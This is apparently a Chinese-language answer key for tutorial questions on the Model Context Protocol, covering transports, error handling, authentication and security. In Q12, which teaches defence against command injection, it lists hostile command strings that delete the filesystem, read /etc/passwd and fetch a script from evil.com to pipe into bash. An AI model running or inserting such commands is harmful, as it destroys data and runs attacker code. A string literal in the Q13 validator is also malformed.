# 启发性问题 —— 参考答案

## Q1: 为什么 MCP 选择 JSON-RPC 2.0？

**答案**：

JSON-RPC 2.0 的核心语义是 **"远程过程调用"**（Remote Procedure Call），这与 MCP 的"工具调用"场景天然匹配：

- **函数调用语义**：`tools/call` 本质上是"调用函数 → 返回结果"，JSON-RPC 的 request/response 模式精准映射这一语义
- **REST 的问题**：REST 是资源导向的（GET/POST/PUT/DELETE 操作资源），而工具调用天然是过程导向的
- **gRPC 的问题**：gRPC 基于 HTTP/2 + Protobuf，二进制序列化，调试困难，且 stdio 模式无法使用 HTTP/2
- **JSON-RPC 的优势**：
  - **简单**：请求/响应/通知三种消息类型，学习成本极低
  - **文本化**：JSON 可读可调试，适合 AI 领域的"可解释性"要求
  - **传输无关**：JSON-RPC 不绑定传输层，可以跑在 stdio、HTTP、WebSocket 等任何双向通道上
  - **通知机制**：无需响应的 Notification 类型，完美支持服务端推送事件

**核心洞察**：MCP 不是在"操作资源"，而是在"调用能力"。

---

## Q2: stdio 如何保证消息边界？

**答案**：

stdio 模式使用 **NDJSON (Newline-Delimited JSON)** 格式：
```
{"jsonrpc":"2.0",...}\n
{"jsonrpc":"2.0",...}\n
```

**换行符问题**：`json.dumps()` 会自动转义字符串内的换行符：
```python
import json
json.dumps({"text": "hello\nworld"})
# → '{"text": "hello\\nworld"}'
# 字符串中的 \n 被转义为 \\n（两个字符），不会与消息分隔符混淆
```

**关键保证**：
1. JSON 规范要求字符串中的控制字符必须转义
2. `json.dumps` 和 `json.loads` 双向保证转义/反转义正确
3. 只要使用标准 JSON 库，**JSON 内容永远不会包含字面的换行符**

**分帧算法**：
```
读取一行 → json.loads() → 处理消息 → 读取下一行
```

---

## Q3: SSE 为什么需要两个端点？

**答案**：

**SSE 规范的根本限制**：SSE 是**严格单向**的（Server → Client）。客户端通过 HTTP GET 建立连接后，只能接收服务端推送的事件，**无法通过同一连接发送数据**。

**MCP 的解决方案**：
- GET `/sse`：服务端→客户端（SSE 事件流，推送响应和通知）
- POST `/mcp`：客户端→服务端（普通 HTTP 请求，发送 JSON-RPC 消息）
- `sessionId`：关联两个端点的"会话标识符"

**能否合并？** Streamable HTTP 已经实现了这个目标！
```
SSE:  GET /sse (建立流) + POST /mcp (发送消息)
Stream: POST /mcp (发送消息 + 可选的响应流)
```

Streamable HTTP 通过让客户端在 POST 请求的 `Accept` header 中指定响应格式（JSON 或 SSE 流），实现了单端点双向通信。服务端根据 `Accept` header 决定是一次性返回还是建立 SSE 流。

---

## Q4: SSE 断连与重连设计

**答案**：

**断开时的影响**：
1. **正在执行的工具调用**：POST 请求通常已经发出，但响应需要通过 SSE 推送回来。如果 SSE 在响应推送前断开，客户端永远收不到结果。
2. **pending 的请求**：所有等待中的请求都会超时。

**可靠重连设计**：

```python
import asyncio

async def connect_with_retry(url: str, max_retries: int = 5):
    """带重连的 SSE 客户端连接"""
    for attempt in range(max_retries):
        try:
            async with sse_client(url) as (read_stream, write_stream):
                async with ClientSession(read_stream, write_stream) as client:
                    await client.initialize()
                    return client
        except Exception as e:
            if attempt == max_retries - 1:
                raise
            wait_time = 2 ** attempt  # 指数退避
            print(f"连接失败，{wait_time}秒后重试... ({attempt + 1}/{max_retries})")
            await asyncio.sleep(wait_time)
```

**关键策略**：
- 幂等操作可安全重试（如 `tools/list`）
- 非幂等操作需要幂等键（idempotency key）机制
- 设置合理的超时时间（避免永久 pending）
- 使用指数退避防止惊群效应

---

## Q5: Streamable HTTP 的无状态设计

**答案**：

**什么是"无状态"**：每个 POST 请求是独立的，服务端处理完即释放所有资源，不保留任何会话状态。

```python
# 无状态模式：每个请求创建新的 Server + Transport
async def handle_mcp(request: Request):
    """POST /mcp —— 处理所有 JSON-RPC 通信"""
    body = await request.json()

    server = Server("mcp-demo-stream-server")     # 新实例

    @server.list_tools()
    async def handle_list_tools() -> types.ListToolsResult:
        return types.ListToolsResult(tools=DEMO_TOOLS)

    @server.call_tool()
    async def handle_call_tool(name, arguments):
        return dispatch_tool(name, arguments or {})

    transport = StreamableHTTPServerTransport()

    async with transport.connect() as (read_stream, write_stream):
        await server.run(
            read_stream, write_stream,
            InitializationOptions(
                server_name="mcp-demo-stream-server",
                server_version="1.0.0",
                capabilities=server.get_capabilities(
                    notification_options=NotificationOptions(),
                    experimental_capabilities={},
                ),
            ),
        )
    # 函数返回后，server 和 transport 被 GC
```

**如果需要推送进度通知呢？**

这时就需要**有状态的 Streamable HTTP**：

```python
# 有状态模式：传入 session_id 启用会话管理
transport = StreamableHTTPServerTransport(session_id="abc123")

# 服务端可通过 transport 向客户端推送通知
await transport.send_notification({
    "method": "notifications/progress",
    "params": {"progress": 50, "total": 100}
})
```

**核心权衡**：无状态 = 简单 + 可扩展；有状态 = 功能强 + 需管理 session。

---

## Q6: 什么时候选 stdio vs SSE vs Streamable HTTP？

**答案**：

| 场景 | 推荐 | 理由 |
|------|------|------|
| 本地 CLI 工具 | **stdio** | 零配置、无网络依赖、进程隔离 |
| IDE 插件 | **stdio** | 编辑器直接管理子进程 |
| Web 服务集成 | **SSE** 或 **Streamable HTTP** | 远程通信、多客户端 |
| Serverless 部署 | **Streamable HTTP** | 无状态、单端点 |
| 高频调用（<1ms延迟） | **stdio** | 进程间通信，开销最低 |
| 多客户端共享 | **SSE** 或 **Streamable HTTP** | stdio 天生单客户端 |
| 新项目 | **Streamable HTTP** | 推荐首选，向后兼容 |
| 遗留系统集成 | **SSE** | 大量现有 MCP Server 仍用 SSE |

**决策树**：
```
需要远程访问？
  ├─ 否 → stdio
  └─ 是 →
        需要 Serverless / 无状态？
          ├─ 是 → Streamable HTTP
          └─ 否 → SSE 或 Streamable HTTP（推荐 Streamable HTTP）
```

---

## Q7: 客户端如何发现 MCP Server 提供了哪些工具？

**答案**：

通过 MCP 协议的 `tools/list` 方法动态发现：

```python
# 客户端代码
async with ClientSession(read_stream, write_stream) as client:
    await client.initialize()

    # 调用 tools/list 获取可用工具
    tools_result = await client.list_tools()

    for tool in tools_result.tools:
        print(f"工具: {tool.name}")
        print(f"描述: {tool.description}")
        print(f"参数: {tool.inputSchema}")
```

**为什么不是静态配置？**
- 动态发现允许服务端根据运行时状态选择性暴露工具
- 服务端升级/降级时，客户端自动感知
- 支持按用户/权限动态调整可用工具集合

---

## Q8: 为什么 SSE 的清理逻辑至关重要？

**答案**：

SSE 的 `connect_sse()` 上下文管理器自动管理 transport 生命周期。使用 `async with` 确保连接断开时自动清理：

```python
async def handle_sse(request: Request):
    async with sse_transport.connect_sse(
        request.scope, request.receive, request._send
    ) as (read_stream, write_stream):
        # ... 处理连接 ...
        pass
    # async with 退出时自动清理 transport 和 session 映射
```

**如果映射没有清理会导致**：
1. **内存泄漏**：每个断开的连接仍占据内存空间
2. **sessionId 冲突**：旧 sessionId 可能阻止新连接
3. **资源耗尽**：长时间运行的服务端可能 OOM

**Python 的优势**：`async with` 上下文管理器保证了清理的可靠性，即使发生异常也会执行清理。

---

## Q9: 哪种传输最适合 Serverless？

**答案**：**Streamable HTTP** 是最佳选择。

**原因**：
1. **无状态**：Serverless 函数天然短生命周期（通常 < 15分钟），无状态设计完美匹配
2. **单端点**：只需暴露一个 POST 端点，FaaS 配置简单
3. **无需 sticky session**：请求可路由到任意实例
4. **冷启动友好**：无需维持长连接

**SSE 不适合的原因**：
- 长连接超过函数最大执行时间
- 需要 sticky session（函数实例不固定）

**stdio 不适合的原因**：
- 无法远程访问
- 无法 spawn 子进程（serveless 环境限制）

---

## Q10: Accept header 的区别？

**答案**：

```python
# 客户端可通过 Accept header 控制响应格式

# 方式 1: JSON 响应（一次性）
# 客户端发送 POST，Accept: application/json
# 服务端返回标准 JSON-RPC 响应

# 方式 2: SSE 流式响应
# 客户端发送 POST，Accept: text/event-stream
# 服务端建立 SSE 流，可持续推送多条消息
```

| Accept Header | 响应格式 | 推送机制 | 使用场景 |
|---------------|----------|----------|----------|
| `application/json` | 标准 JSON | 一次性 | 普通工具调用 |
| `text/event-stream` | SSE 流 | 持续推送 | 需要进度通知 |

---

## Q11: 为什么返回错误内容而不是抛异常？

**答案**：

```python
# 正确做法：捕获异常，返回错误内容
@server.call_tool()
async def handle_call_tool(
    name: str, arguments: dict | None
) -> list[types.TextContent]:
    try:
        return dispatch_tool(name, arguments or {})
    except ValueError as error:
        # 返回错误内容，连接保持正常
        return [types.TextContent(
            type="text",
            text=f"参数无效: {str(error)}"
        )]
    except Exception as error:
        return [types.TextContent(
            type="text",
            text=f"服务器内部错误: {str(error)}"
        )]

# 错误做法：抛出未捕获异常
# 会导致进程退出（stdio）或 500 错误（HTTP）
# raise RuntimeError("boom")  ← 不要这样做
```

**核心原则**：
- **返回错误** = 工具执行失败，协议层正常（连接不断）
- **抛出异常** = 协议层错误，连接可能断开
- LLM 可以理解 `isError` 标记的错误信息，决定是否重试或换参数

---

## Q12: "执行 Shell 命令"工具的安全风险

**答案**：

**核心风险**：命令注入攻击。

```python
# ❌ 危险实现 —— 直接拼接字符串
async def execute_command(command: str):
    import subprocess
    result = subprocess.run(command, shell=True)  # shell=True 极其危险
    return result.stdout

# LLM 可能被诱导生成:
#   "ls; rm -rf /"  
#   "cat /etc/passwd"
#   "$(curl evil.com/steal.sh | bash)"

# ✅ 安全实现 —— 白名单 + 参数化 + 沙箱
ALLOWED_COMMANDS = {"ls", "cat", "wc", "grep"}

async def execute_safe_command(cmd: str, args: list[str]):
    if cmd not in ALLOWED_COMMANDS:
        raise ValueError(f"不允许的命令: {cmd}")

    # 使用列表参数（非字符串），避免 shell 注入
    result = subprocess.run(
        [cmd] + args,
        capture_output=True,
        timeout=30,
        shell=False,  # 关键：不使用 shell
        cwd="/safe/workdir"  # 限制工作目录
    )
    return result.stdout.decode()
```

**安全清单**：
| 措施 | 说明 |
|------|------|
| 命令白名单 | 只允许预定义的命令 |
| `shell=False` | 使用列表参数，禁止 shell 解析 |
| 路径限制 | 限制可访问的文件系统范围 |
| 超时控制 | 防止长时间运行的恶意命令 |
| 审计日志 | 记录所有命令执行 |
| 资源限制 | 限制 CPU/内存使用 |

---

## Q13: 防止恶意参数攻击

**答案**：

```python
# MCP 的 Schema 验证是第一道防线
# inputSchema 定义了预期的参数类型和约束

inputSchema = {
    "type": "object",
    "properties": {
        "name": {"type": "string", "maxLength": 100},  # 限制长度
        "count": {"type": "integer", "minimum": 1, "maximum": 100},  # 限制范围
        "email": {"type": "string", "format": "email"},  # 格式验证
    },
    "required": ["name"],  # 必填项
    "additionalProperties": False,  # 禁止额外字段
}

# 除了 Schema 验证，业务层还需要额外校验
def validate_and_sanitize(args: dict):
    # 1. Schema 验证（SDK 自动完成）
    # 2. 业务语义校验
    name = args.get("name", "")
    if len(name.strip()) == 0:
        raise ValueError("name 不能为空")
    if any(c in name for c in "<>&"\''):
        raise ValueError("name 包含非法字符")
    # 3. 日志脱敏
    safe_name = name[:10] + "..." if len(name) > 10 else name
    logger.info(f"处理请求: name={safe_name}")
```

**纵深防御**：
1. **Schema 层**：类型、格式、范围验证
2. **业务层**：语义校验、合法性检查
3. **基础设施层**：限流、IP 白名单、WAF

---

## Q14: 多客户端共享状态如何设计？

**答案**：

stdio 天然不支持多客户端（一个进程一个连接）。HTTP 模式下：

```python
# 方案 A：使用共享连接池（Streamable HTTP）
import asyncio

# 全局共享资源
shared_db_pool = create_db_pool(max_connections=10)

async def handle_mcp(request: Request):
    server = Server("mcp-demo")

    @server.call_tool()
    async def handle_query(name: str, arguments: dict | None):
        args = arguments or {}
        # 使用共享连接池执行查询
        async with shared_db_pool.acquire() as conn:
            result = await conn.fetch(args.get("sql"))
        return [types.TextContent(type="text", text=str(result))]

    # ... 每个请求使用共享 Server 和 dbPool
    transport = StreamableHTTPServerTransport()
    async with transport.connect() as (read_stream, write_stream):
        await server.run(read_stream, write_stream, init_opts)

# 方案 B：SSE 模式广播通知
async def broadcast_notification(method: str, params: dict):
    """向所有活跃的 SSE 连接推送通知"""
    # SseServerTransport 内部维护了所有活跃的 transport
    # 可通过遍历发送通知
    pass
```

---

## Q15: 设计流式工具调用结果

**答案**：

当前 MCP 不支持工具执行过程中返回中间结果。如果设计这个扩展：

```python
# 方案：使用 JSON-RPC Notification 推送进度
# Client → Server:
# { "method": "tools/call", "id": 1, "params": { "name": "analyze", ... } }

# Server → Client (多次):
# { "method": "notifications/progress", "params": {
#     "token": 1, "progress": 30, "total": 100
# }}
# { "method": "notifications/progress", "params": {
#     "token": 1, "progress": 60, "total": 100
# }}

# 在 Python 中实现：
@server.call_tool()
async def handle_analyze(name: str, arguments: dict | None):
    # 获取 transport 引用以发送通知
    # transport.send_notification(...)

    result_parts = []
    for i in range(10):
        part = do_analysis_step(i)
        result_parts.append(part)
        # 发送进度通知
        # await transport.send_notification({
        #     "method": "notifications/progress",
        #     "params": {"progress": (i + 1) * 10, "total": 100}
        # })

    return [types.TextContent(type="text", text="\n".join(result_parts))]
```

**关键设计点**：
- `token` 关联进度通知和原始请求
- `progress/total` 可选的进度百分比
- 最终响应保持标准格式（向后兼容）

---

## Q16: 三种模式的认证方案

**答案**：

```python
# === stdio 模式 ===
# 认证 = OS 进程权限（服务端以当前用户权限运行）
# 无需额外实现

# === SSE / Streamable HTTP 模式 ===
from starlette.middleware.base import BaseHTTPMiddleware
from starlette.responses import JSONResponse

class AuthMiddleware(BaseHTTPMiddleware):
    async def dispatch(self, request: Request, call_next):
        token = request.headers.get("Authorization", "").replace("Bearer ", "")
        if not validate_token(token):
            return JSONResponse({"error": "Unauthorized"}, status_code=401)
        return await call_next(request)

app = Starlette(
    routes=[...],
    middleware=[Middleware(AuthMiddleware)]
)

# OAuth 2.0 集成（概念示例）
from mcp.client.auth import OAuthProvider

class MyOAuthProvider(OAuthProvider):
    async def get_token(self):
        # 实现 OAuth 流程
        return await oauth_flow.get_access_token()
```

**三种模式对比**：

| 模式 | 认证方式 | 复杂度 |
|------|----------|--------|
| stdio | OS 进程权限（天然隔离） | 无 |
| SSE | Bearer Token / OAuth / API Key | 中 |
| Streamable HTTP | Bearer Token / OAuth / API Key + 每次请求验证 | 低（无状态） |

---

## Q17: 长时间工具调用的超时和取消

**答案**：

```python
import asyncio

# === 客户端超时策略 ===
TIMEOUTS = {
    "tools/list": 5,       # 工具列表：5秒
    "tools/call": 30,      # 工具调用：30秒
}

async def call_with_timeout(client, tool_name: str, args: dict):
    timeout = TIMEOUTS.get(tool_name, 30)

    try:
        result = await asyncio.wait_for(
            client.call_tool(tool_name, args),
            timeout=timeout
        )
        return result
    except asyncio.TimeoutError:
        raise TimeoutError(f"工具 {tool_name} 超时 ({timeout}s)")

# === 取消机制（MCP 规范正在讨论中） ===
# 草案方案：
# Client → Server:
#   {"method": "notifications/cancelled", "params": {"requestId": 1}}
# Server: 收到后中止对应的异步操作

# Python 实现思路：
# 使用 asyncio.Task 和 cancel()
task = asyncio.create_task(long_running_operation())

# 收到取消通知后
task.cancel()
try:
    await task
except asyncio.CancelledError:
    logger.info("操作已被取消")
```

**多层超时策略**：
1. 连接超时（TCP 层）
2. 请求超时（HTTP 层）
3. 业务超时（工具层，`asyncio.wait_for`）

---

## Q18: MCP vs OpenAI Function Calling

**答案**：

| 维度 | MCP | OpenAI Function Calling |
|------|-----|------------------------|
| **协议性质** | 开放标准 | 厂商私有 API |
| **工具注册** | 运行时动态发现（tools/list） | 请求时随附 function 定义 |
| **工具位置** | 独立进程/服务 | 嵌入在 API 调用中 |
| **可移植性** | ✅ 任何 LLM 都可使用 | ❌ 仅 OpenAI（除非兼容API） |
| **生态** | 社区共建 MCP Server | 仅 OpenAI 定义 |
| **传输灵活性** | stdio/SSE/Stream | HTTP API only |
| **状态管理** | 会话级或请求级 | 请求级 |
| **复杂度** | 需要独立部署 Server | 仅需定义 JSON Schema |
| **Python 支持** | ✅ mcp Python SDK | ✅ openai Python SDK |

**MCP 的核心优势**：
1. **开放协议**：不绑定任何 LLM 厂商
2. **工具复用**：一个 MCP Server 可被多个 LLM 使用
3. **能力发现**：LLM 可主动查询 Server 有哪些工具（tools/list）
4. **社区生态**：任何人可发布 MCP Server
5. **本地优先**：stdio 模式可在完全离线环境运行
